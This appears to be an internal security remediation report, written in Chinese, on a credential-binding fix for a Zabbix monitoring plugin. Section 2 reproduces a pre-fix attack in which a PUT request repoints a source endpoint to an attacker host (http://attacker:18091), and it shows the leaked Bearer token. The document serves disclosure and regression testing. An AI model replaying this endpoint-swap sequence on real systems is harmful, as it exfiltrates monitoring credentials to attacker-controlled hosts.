# G13-A.2 — Credential Boundary & Production Hardening

- 日期：2026-11-06
- 基线：#40 `b2d635b`（基于 #38 `99fd9b2`）
- 分支：`feat/g13-a2-credential-binding`
- 前置文档：[G13-A.1 交付](g13-a1-security-runtime-closure.md)、[ADR-017](../../adr/ADR-017-credential-endpoint-binding.md)
- 约束：本轮不 merge、不 tag、不 release、不 deploy；所有结论以代码、攻击复现和可审计证据为准。

## 1. Baseline

| 项 | 值 |
|---|---|
| 起点 | #40 head `b2d635b`（15/15 CI） |
| 本分支 | `feat/g13-a2-credential-binding`（基于 #40） |
| 依赖 | #38 → #40 → 本 PR；#34 → #35 → #39 |
| 未合并 | #34、#35、#38、#39、#40、本 PR |

## 2. 安全发现

### P0：Source 写权限可以把凭据发送到任意 Endpoint

**攻击前提**：调用者拥有某 Workspace 的 `telemetry.source.write`（Operator/Admin），该 Workspace 已配置一个合法 `secretref` 与受信任 Zabbix Endpoint。调用者不需要读取明文 Secret。

**复现**：在 `b2d635b`（修复前）上，用真实插件 Socket + 真实攻击接收端手工运行同一攻击序列，观测到：

```
POST /sources { endpoint: approved, credential: secretref:zabbix/main } -> 201
PUT  /sources/{id} { endpoint: http://attacker:18091, credential: <same ref> } -> 200
GET  /sources/{id}/hosts -> 200
attacker Authorization log -> ["Bearer g13a2-secret-token"]
facts: {"swappedStatus":200,"hostsStatus":200,"leaked":["Bearer g13a2-secret-token"]}
```

`tests/ci/g13a2_endpoint_attack.test.mjs` 是**修复后的回归测试**，不再包含“故意攻击成功”的断言；上面的 facts 是修复前手工复现的记录。复现步骤：checkout `b2d635b`，启动一个真实接收端，保留合法 ref 调用 PUT 改 endpoint，再 GET hosts，检查接收端的 Authorization。

**根因**：`credential.ref` 只受 Workspace 约束，没有与 Endpoint 绑定；`source.write` 隐含了“重新指定该凭据使用目标”的权限，而这是 `credential.manage` 级别的动作。

**影响**：任意拥有 Source 写权限的 Operator 可以把 Workspace 的监控 Token 外送到自己控制的公网 HTTP/HTTPS 端点；SSRF 只限制内网/回环，公网攻击端点在允许范围内。生产启用前必须阻断。

**修复**：ADR-017 的五元组绑定；Source 创建/更新与每次出站读取都检查；历史 Source fail closed。攻击者接收端在修复后收到 0 个 Authorization。

### 其他发现

- `basic` 凭据此前声明后仍发送 `Bearer`，属于安全语义错误；现在发送真正的 HTTP Basic，非法 `user:password` 返回 422。
- HTTP/`verifyTls=false` 此前只由调用方决定；现在 `VERIFY` 绑定强制 HTTPS+校验，`TEST_PLAINTEXT` 还需要部署显式 `OPSWEAVE_ALLOW_INSECURE_SOURCE_ENDPOINTS=1`。
- 绑定是静态部署配置；不能把“隐藏 credential.ref”当作修复。

### 2.1 独立审查发现（已修）

- **P1（凭据进入错误路径）**：Node 的 Docker 错误上下文拼接了完整参数，`docker create` 失败时会把 `--env OPSWEAVE_PLUGIN_SECRETS=<token>` 写入 Node 日志、实例 status 与 Kernel `last_error`。现在 `redacted_command` 对 `--env`/`--build-arg` 值全部遮蔽，并对 secret-shaped `KEY=VALUE` 兜底；有单测。超过 8 KiB 的 env 条目不再静默丢弃，而是告警（插件 fail closed）。
- **P2**：Kernel 现在校验 binding 的 workspace UUID/ref/endpoint/TLS，拒绝 userinfo/query/fragment；`statusFromProbe` 对 plaintext HTTP 返回 DEGRADED 而非 READY；`basic` 的 `user:password` 在创建/更新时校验；probe/items/collect 的历史行攻击路径、normalize/parser 边界测试补齐；ADR 的生命周期/迁移措辞已修正（Kernel 不代理 Source 写入；A.1 迁移窗口需维护/轮换；一个 ref 只绑定一个 endpoint）。

## 3. 实现

### 3.1 Binding

```json
{"<pluginId>":{"<workspaceId>":{"secretref:...":{"endpoint":"https://zabbix.example/api_jsonrpc.php","tls":"VERIFY"}}}}
```

- Kernel `OPSWEAVE_PLUGIN_CREDENTIAL_BINDINGS` → 只注入该插件的切片，与 `OPSWEAVE_PLUGIN_SECRETS` 并列。
- Endpoint 规范化精确匹配：小写 scheme/host、去默认端口、保留 path、拒绝 query/fragment/userinfo；多个 Endpoint 通过多条绑定显式授权。
- 强制点：create、update、probe、hosts、items、collect；attestation 不出站。
- 错误码：`ZBX_CREDENTIAL_BINDING_REQUIRED`、`ZBX_CREDENTIAL_ENDPOINT_MISMATCH`、`ZBX_INSECURE_ENDPOINT_FORBIDDEN`、`ZBX_BASIC_CREDENTIAL_INVALID`（稳定、可本地化，不回显 Secret）。

### 3.2 TLS / Basic

- `VERIFY`：https + `verifyTls !== false`；否则 403。
- `TEST_PLAINTEXT`：http/关闭校验，但必须同时有部署显式 flag；flag 由 Kernel 注入，生产默认关闭。
- `basic`：`Authorization: Basic base64(user:password)`；无冒号 → 422。`api-token` 仍是 Bearer。
- 开发用的扁平 `OPSWEAVE_ZABBIX_SECRETS` 现在必须同时满足 `OPSWEAVE_ALLOW_DEV_SECRETS=1` 与 `NODE_ENV !== production`；NODE_ENV 不是唯一开关，未显式允许时无凭据（fail closed）。

### 3.3 生命周期

见 ADR-017 §3：绑定/Token/Adapter 轮换需要替换实例（disable→deploy 或新版本），Node 重启不会刷新已收养容器的 env；旧实例窗口已记录。Adapter 撤销必须轮换/移除密钥，不能只删 adapter→plugin 映射。

## 4. 验证矩阵

### 4.1 攻击复现与 Socket 用例

`tests/ci/g13a2_endpoint_attack.test.mjs`（真实插件 HTTP + 真实攻击接收端；修复后回归）：

- 修复前手工事实：`{"swappedStatus":200,"hostsStatus":200,"leaked":["Bearer g13a2-secret-token"]}` —— 已记录为 P0 证据；
- 修复后：PUT swap → 422 `ZBX_CREDENTIAL_ENDPOINT_MISMATCH`；直接创建攻击端点 → 422；合法端点 hosts → 200；历史行（直接改存储）→ 422；攻击接收端 Authorization 始终为 0；
- 绑定缺失 → 422 `ZBX_CREDENTIAL_BINDING_REQUIRED`；
- `VERIFY` 绑定拒绝 http / `verifyTls=false`（403/422）；
- `TEST_PLAINTEXT` 无部署 flag → 403；有 flag → 允许；
- `basic` 发送 `Authorization: Basic base64(user:password)`；无冒号 → 422 `ZBX_BASIC_CREDENTIAL_INVALID`。

**8/8 PASS**（攻击回归、probe/items/collect、normalize、parser、TLS/basic）。

### 4.2 Kernel / 插件回归

- Kernel：**205 tests PASS**（含 64 incident、binding 解析、per-plugin binding 注入隔离）。
- 插件：**59 tests PASS**（26 原有 unit + socket + 新增 binding/TLS/basic/攻击）。
- 契约：`python3 tests/contract/validate_contracts.py` PASS。
- A.1 回归：Workspace-bound v2、v1 拒绝、跨 Workspace Evidence 拒绝、内容完整性、Investigator/Verifier 不变。

### 4.3 真实 Gateway/Node/OCI

`tests/ci/g13a1_gateway_e2e.sh` 扩展了攻击接收端与绑定：

- Kernel 以 `OPSWEAVE_PLUGIN_CREDENTIAL_BINDINGS` 注入 A/B 的实测绑定（`http://<fixture>:18090/api_jsonrpc.php`, `TEST_PLAINTEXT`），并显式设置 `OPSWEAVE_ALLOW_INSECURE_SOURCE_ENDPOINTS=1`；
- 先用一个只绑定到攻击接收端的 **dummy ref**（`secretref:test/attacker`）完成一次 hosts，证明容器确实能到达接收端（只发送 `attacker-probe-token`，随后清空日志），避免“0 Authorization”成为空断言；
- Gateway PUT endpoint swap → 422 `ZBX_CREDENTIAL_ENDPOINT_MISMATCH`；直接创建攻击端点 Source → 422；两处拒绝后攻击接收端 Authorization **0**；
- 合法绑定 probe/hosts/items/collect 通过；SOURCE_ATTESTED 与字节读回一致；plaintext HTTP 的源状态为 DEGRADED（不再谎报 READY）；
- 浏览器 1440/1024/390 Collect+Save 通过；Investigator 引用 Evidence；人工 CONFIRMED Verdict；
- 直接改插件 DB 的历史 Source（endpoint 指向攻击者）→ 422，攻击接收端 0；
- 插件/Kernel 重启、容器安全（65532、read-only、192 MiB/0.5 CPU/256 PIDs、cap-drop ALL、no-new-privileges、无 docker.sock、digest 一致）保持通过。

### 4.4 CI

（待最终运行填入。）

## 5. Merge Preflight

只读模拟（`git merge-tree --write-tree`），未执行任何合并：

| 合并 | 结果 |
|---|---|
| `main` + #34 | clean |
| #34 + #35 | clean |
| #35 + #39 | clean |
| #38 + #40 | clean |
| #40 + 本分支 | clean |
| #38 + #39 | **conflict**: `tests/ui/overview-partial.spec.ts` |
| #40 + #39 | **conflict**: 同一文件 |

原因：#39 基于 #35（其 `overview-partial.spec.ts` 仍是 #36 之前的版本），而 #38 基于 main（包含 #36 的本地化标题修复）；两者相对共同基线都改了该文件。**这不是“GitHub base branch 正确”就能忽略的集成缺口**：#39 运行时依赖 #38 的契约，合并时必须先把 main（含 #38）合入 #39/#35 并手解这一处，保留 #36 的本地化断言与 #35 的视觉改动，然后重跑 #39 的 UI/契约 checks；不能只依据 base branch 认定集成完成。

本分支（A.2）与 #39 的 delta 唯一共同文件是 `.github/workflows/ci.yml`（A.2 改 zabbix-plugin/psql， #39 改 UI job；merge-tree 自动合并，无冲突）；产品源码无重叠。但 **#39 必须在 #38 之后合并**，且解决上述 `overview-partial.spec.ts` 冲突。

建议顺序（仍需人工批准，本轮不执行）：

1. #34 → main（merge commit 或 squash；#34 已含 main/#36 的合并）
2. #35 → main（基于 #34）
3. #38 → main
4. #40 → #38（或 #38 合入后 retarget 到 main）
5. 本分支 → #40
6. #39：先合入 main（含 #38）并解决 `overview-partial.spec.ts`，再合并；重新运行 UI 浏览器与契约 checks

生产启用还要求本 ADR/PR 的安全门禁（CREDENTIAL_ENDPOINT_BOUNDARY PASS、SECRET_ROTATION_REVOCATION 的明确窗口）关闭。

## 6. Verdicts

| Verdict | 状态 | 依据 |
|---|---|---|
| `CREDENTIAL_ENDPOINT_BOUNDARY` | **PASS** | 6 个真实 Socket 攻击用例 + 真实 Gateway 攻击矩阵：swap/create/historical 全部拒绝，攻击接收端 0 Authorization；合法绑定正常 |
| `WORKSPACE_SECRET_ISOLATION` | **PASS** | A.1 的 per-workspace ref 测试 + A.2 binding 按 workspace 切片；A 用 B 的 ref 422；插件只收到自己的绑定 |
| `SECRET_ROTATION_REVOCATION` | **PARTIAL** | 替换实例的语义已验证/文档化；无在线 Secret Store/轮换后台；旧实例窗口仍在 |
| `WORKSPACE_ATTESTATION_V2` | **PASS** | A.1 的 v2 签名、v1 拒绝、跨 Workspace 拒绝、tamper/replay 回归保持通过 |
| `GATEWAY_NODE_OCI_E2E` | **PASS（本地真实栈）** | 真实 Gateway→Node→OCI→fixture，攻击矩阵 + 浏览器 + Investigator + Verdict + 重启 + 容器安全；最终 CI 结果见下 |
| `SOURCE_EVIDENCE_INTEGRITY` | **PASS** | 字节→摘要→验签→存储→读回一致；错误摘要/跨 workspace/v1 拒绝回归 |
| `REAL_ZABBIX_VERIFIED` | **NOT_RUN** | 无真实 Zabbix 实例；fixture 不作为真实响应形状证据 |
| `PRODUCTION_SECRET_READY` | **PARTIAL** | 环境变量交付 + 静态绑定；不是独立 Secret Store；轮换需替换实例 |
| `INTEGRATION_READY` | **PARTIAL** | 真实栈安全矩阵通过；真实 Zabbix 与生产 Secret Store 未接入 |

## 7. 下一阶段

G13-B：Trigger/Event → `source + nativeId` 去重 → Incident → 时间窗采集 → Evidence → Investigation → Human Verdict；不自动关闭 Incident，不让 AI 替代 Verdict。安全门禁（本 PR 的绑定、TLS、Secret 生命周期）关闭前不进入生产。
